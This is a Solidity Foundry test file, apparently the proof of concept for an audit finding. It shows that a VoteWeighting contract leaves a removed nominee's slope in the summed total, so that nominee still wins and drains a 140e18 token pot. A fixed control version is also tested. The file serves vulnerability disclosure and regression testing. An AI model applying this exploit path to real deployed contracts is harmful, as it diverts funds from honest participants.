// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    OLAS,
    VoteWeighting
} from "./34920-h-01-pointssumslope-not-updated-after-nominee-removal-and-vo.sol";

contract VoteWeightingFixed is VoteWeighting {
    constructor(address _token, address _owner) VoteWeighting(_token, _owner) {}

    function removeNominee(bytes32 nominee) external override {
        require(msg.sender == owner, "owner");
        uint256 slope = pointsWeight[nominee].slope;
        pointsSum.slope -= slope;
        pointsWeight[nominee].slope = 0;
        uint256 oldWeight = pointsWeight[nominee].bias;
        pointsWeight[nominee].bias = 0;
        pointsSum.bias -= oldWeight;
        removed[nominee] = true;
    }
}

contract Finding34920Test is Test {
    bytes32 internal constant BAD = bytes32(uint256(1));
    bytes32 internal constant GOOD = bytes32(uint256(2));

    function test_exploit_stale_slope_keeps_the_removed_nominee_as_winner() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.remainingPower(), 140e18, "slope still 140e18");
        assertEq(e.fairPower(), 40e18, "fair power is 40e18");
        assertEq(e.winner(), BAD, "removed nominee still wins");
        assertEq(e.rewardPaid(), 140e18, "removed nominee took the pot");
        assertEq(e.honestPaid(), 0, "honest nominee got nothing");
        emit log_named_uint("remaining power", e.remainingPower());
        emit log_named_uint("fair power", e.fairPower());
        emit log_named_uint("reward to removed", e.rewardPaid());
    }

    function test_control_slope_drop_makes_the_honest_nominee_win() public {
        OLAS olas = new OLAS();
        address honest = address(new HonestPayee());
        VoteWeightingFixed weighting = new VoteWeightingFixed(address(olas), address(this));
        weighting.addNominee(BAD, address(this));
        weighting.addNominee(GOOD, honest);
        olas.mint(address(weighting), 140e18);

        weighting.vote(BAD, 100e18, 100e18);
        weighting.vote(GOOD, 40e18, 40e18);
        weighting.removeNominee(BAD);
        weighting.revokeRemovedNomineeVotingPower(BAD);

        (, uint256 slope) = weighting.pointsSum();
        assertEq(slope, 40e18, "control slope dropped to the honest vote");

        weighting.payout();
        assertEq(weighting.lastWinner(), GOOD, "honest nominee wins");
        assertEq(olas.balanceOf(honest), 140e18, "pot paid to the honest nominee");
        assertEq(olas.balanceOf(address(this)), 0, "removed nominee is paid 0");
        emit log_named_uint("control power", slope);
        emit log_named_uint("control paid", olas.balanceOf(honest));
    }
}

contract HonestPayee {}
